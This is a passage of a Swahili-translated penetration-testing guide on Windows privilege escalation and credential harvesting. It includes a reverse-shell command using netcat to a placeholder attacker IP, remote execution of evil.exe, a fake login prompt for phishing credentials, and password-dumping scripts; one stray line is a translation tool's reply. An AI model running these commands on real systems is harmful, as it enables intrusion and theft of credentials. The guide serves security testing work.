**Angalia ikiwa unaweza overwrite baadhi ya registry au binary ambayo itatekelezwa na mtumiaji mwingine.**\
**Soma** ukurasa **ufuatao** ili kujifunza zaidi kuhusu **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Madereva

Tafuta madereva ya **third party weird/vulnerable**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Iwapo driver inatoa arbitrary kernel read/write primitive (kawaida katika IOCTL handlers zilizotengenezwa vibaya), unaweza kupandisha hadhi kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory. Tazama mbinu ya hatua‑kwa‑hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

Ikiwa una **uruhusa za kuandika ndani ya folda iliyo kwenye PATH**, unaweza kuwa na uwezo wa hijack DLL inayopakiwa na process na **escalate privileges**.

Kagua ruhusa za folda zote ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Sehemu zilizoshirikiwa
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana zilizohardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Violesura vya Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Wazi

Angalia huduma **zilizo na vikwazo** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha rules, unda rules, zima, zima...)**

Zaidi[ amri za network enumeration hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` inaweza pia kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa unapata root user unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port itakuuliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Uthibitisho wa Windows

### Winlogon Uthibitisho
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Meneja wa Credentials / Windows Vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault huhifadhi sifa za watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** inaweza **kuingia kwa watumiaji kiotomatiki**y. Kwa mwanzo, inaweza kuonekana kwamba watumiaji wanaweza kuhifadhi sifa zao za Facebook, Twitter, Gmail n.k., ili wajingie moja kwa moja kupitia vivinjari. Lakini sivyo.

Windows Vault huhifadhi sifa ambazo Windows inaweza kuingia kwa watumiaji kiotomatiki, ambayo inamaanisha kwamba programu yoyote ya **Windows inayohitaji sifa ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** & Windows Vault na kutumia sifa zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nywila kila mara.

Isipokuwa programu hizo zinashirikiana na Credential Manager, sidhani kwamba zinaweza kutumia sifa za rasilimali fulani. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba sifa za rasilimali hiyo** kutoka kwenye vault ya uhifadhi ya chaguo-msingi.

Tumia `cmdkey` kuorodhesha sifa zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` kwa chaguo la `/savecred` ili kutumia sifa zilizohifadhiwa. Mfano ufuatao unaitisha binary ya mbali kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya credential iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka kwa [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** inatoa njia ya usimbaji wa simetriki wa data, inayotumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya usimbaji wa simetriki wa funguo binafsi za asymmetric. Usimbaji huu unatumia siri ya mtumiaji au mfumo ili kuchangia kwa kiasi kikubwa entropia.

**DPAPI inaruhusu usimbaji wa funguo kupitia ufunguo wa simetriki unaotokana na siri za kuingia za mtumiaji**. Katika hali za usimbaji za mfumo, inatumia siri za uthibitishaji za domain ya mfumo.

Funguo za RSA za watumiaji zilizosimbwa kwa kutumia DPAPI huhifadhiwa kwenye kichunguzi `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, kwa kawaida inajumuisha 64 bytes za data za nasibu. (Ni muhimu kukumbuka kwamba upatikanaji wa saraka hii umezuiliwa, ukizuia kuorodhesha yaliyomo yake kwa kutumia amri ya `dir` katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` kwa hoja zinazofaa (`/pvk` au `/rpc`) ili kuifungua.

Mafaili ya **credentials yaliyolindwa na master password** kwa kawaida yanapatikana katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` na `/masterkey` inayofaa ili decrypt.\
Unaweza **extract many DPAPI** **masterkeys** kutoka **memory** kwa module ya `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vyeti vya PowerShell

Vyeti vya PowerShell mara nyingi hutumika kwa ajili ya uandishi wa script na kazi za otomatiki kama njia rahisi ya kuhifadhi vyeti vilivyosimbwa. Vyeti hivyo vinalindwa kwa kutumia DPAPI, ambayo kwa kawaida inamaanisha vinaweza kufunguliwa (ku-decrypt) tu na mtumiaji mmoja huo kwenye kompyuta ile ile ambako vilitengenezwa.

Ili **decrypt** PS credentials kutoka kwenye faili inayohifadhi, unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Mtandao wa Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Zilizohifadhiwa

Unaweza kuziona katika `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotumika Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Cheti za Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia **Mimikatz** `dpapi::rdg` module pamoja na `/masterkey` inayofaa ili **decrypt any .rdg files**\
Unaweza **extract many DPAPI masterkeys** kutoka kwenye kumbukumbu kwa kutumia Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye workstations za Windows kuhifadhi **nywila** na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii iko kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inafaa kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kwamba ili ku-recover passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha kwa High Integrity level.**\
**AppCmd.exe** iko katika `%systemroot%\system32\inetsrv\` directory.\
Kama faili hii ipo basi inawezekana kwamba baadhi ya **credentials** zimetangazwa na zinaweza ku-recovered.

Msimbo huu ulitolewa kutoka kwa [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` inapatikana .\
Wasakinishaji huendeshwa kwa **SYSTEM privileges**, wengi wao wana udhaifu kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Mafaili na Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Vifunguo vya Mwenyeji
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys katika rejista

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia hapo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ikiwa utapata ingizo lolote ndani ya njia hiyo, huenda ni ufunguo wa SSH uliohifadhiwa. Imehifadhiwa kwa usimbaji, lakini inaweza kufunguliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haifanyi kazi na ungependa ianze kiotomatiki wakati wa boot, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziweka kwa `ssh-add` na kuingia kwa ssh kwenye mashine. Rejista HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikutambua matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo asimetri.

### Faili zilizoachwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Chelezo za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vyeti za Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Nywila ya GPP iliyohifadhiwa

Kipengele kilikuwa kinapatikana hapo awali kilichoruhusu uenezaji wa akaunti za msimamizi wa kienyeji zilizobinafsishwa kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Walakini, njia hii ilipata kasoro kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML katika SYSVOL, zilikuwa zinaweza kufikiwa na mtumiaji yeyote wa domain. Pili, nywila ndani ya GPP hizi, zilizofichwa kwa AES256 kwa kutumia default key iliyo wazi katika nyaraka, zingeweza kufunguliwa (decrypted) na mtumiaji yeyote aliyethibitishwa. Hii ilikuwa hatari kubwa, kwani inaweza kuruhusu watumiaji kupata uwezo uliopanuliwa.

Ili kupunguza hatari hii, ilitengenezwa function inayosaka faili za GPP zilizohifadhiwa mahali hapa zilizo na field ya "cpassword" ambayo si tupu. Ikiwa faili kama hilo linapatikana, function huifungua nywila (decrypt) na kurudisha custom PowerShell object. Object hii inajumuisha taarifa kuhusu GPP na eneo la faili, kusaidia kutambua na kurekebisha udhaifu huu wa usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili ku-decrypt cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Usanidi wa Web wa IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config yenye vifikisho:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Nyaraka za kuingia za OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba credentials

Unaweza daima **kumuomba mtumiaji aingize credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuwa anazijua (kumbuka kwamba **kumuuliza** mteja moja kwa moja kuhusu **credentials** ni hatari sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na credentials**

Faili zilizojulikana ambazo hapo awali ziliwamo **passwords** kwa **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Sina yaliyomo ya faili ulioorezea. Tafadhali tuma yaliyomo ya faili au orodha ya paths (mfano: src/windows-hardening/windows-local-privilege-escalation/README.md na faili zingine) ili niweze kutafuta na kutafsiri maandishi yanayohusika kwenda Kiswahili.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials katika RecycleBin

Unapaswa pia kuangalia Bin kutafuta credentials ndani yake

Ili **recover passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Vifunguo vingine vya registry vinavyoweza kuwa na credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Unapaswa kutafuta dbs ambapo password kutoka **Chrome or Firefox** zinahifadhiwa.\
Pia angalia history, bookmarks na favourites za browsers kwani labda baadhi ya **passwords are** zimehifadhiwa hapo.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu **intercommunication** kati ya vipengele vya programu vinavyotumika kwa lugha tofauti. Kila sehemu ya COM inatambulika kupitia class ID (CLSID) na kila sehemu inafunua uwezo kupitia moja au zaidi ya interfaces, zinazo tambulika kupitia interface IDs (IIDs).

COM classes na interfaces zimefafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii imeundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry mdogo **InProcServer32** ambayo ina **default value** inayomaanisha kwa **DLL** na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kwa msingi, ikiwa unaweza **overwrite any of the DLLs** ambazo zitatekelezwa, unaweza **kupandisha ruhusa** ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Tafuta maudhui ya faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili yenye jina maalum**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta katika registry kwa key names na passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Niliunda plugin hii ili **automatically execute every metasploit POST module that searches for credentials** ndani ya victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) inatafuta moja kwa moja faili zote zenye passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kuchota passwords kutoka kwa mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **sessions**, **usernames** na **passwords** za zana kadhaa zinazohifadhi data hii kwa clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **mchakato unaoendeshwa kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) kwa **ufikiaji kamili**. Mchakato huo huo **pia huunda mchakato mpya** (`CreateProcess()`) **kwa idhini za chini lakini ukirithi handles zote zilizo wazi za mchakato mkuu**.\
Kisha, ikiwa una **ufikiaji kamili kwa mchakato mwenye idhini za chini**, unaweza kuchukua **open handle ya mchakato mwenye idhini iliyoundwa** na `OpenProcess()` na **kuchoma shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, zinazojulikana kama **pipes**, zinawezesha mawasiliano ya mchakato na uhamishaji wa data.

